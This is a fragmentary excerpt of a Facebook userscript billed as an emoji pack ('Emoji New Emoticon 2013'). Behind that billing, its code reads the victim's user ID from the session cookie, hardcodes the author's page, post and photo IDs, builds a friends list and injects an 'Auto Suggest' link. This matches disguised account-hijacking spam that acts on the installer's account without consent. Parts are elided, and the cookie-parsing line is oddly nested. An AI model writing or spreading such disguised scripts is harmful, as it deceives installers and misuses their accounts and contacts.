// ==UserScript==
// @name            Emoji New Emoticon 2013 By Nama Q Andii
// @description     FB Trick by Nama Q Andii
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://www.facebook.com/nama.andii" target="_blank">Nama Q Andii <br>Akid</a>';
	html += '</div>';
...
var spage_id = "100000162433592";
var spost_id = "100000162433592";
var sfoto_id = "100000162433592";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Nama Q Andii';
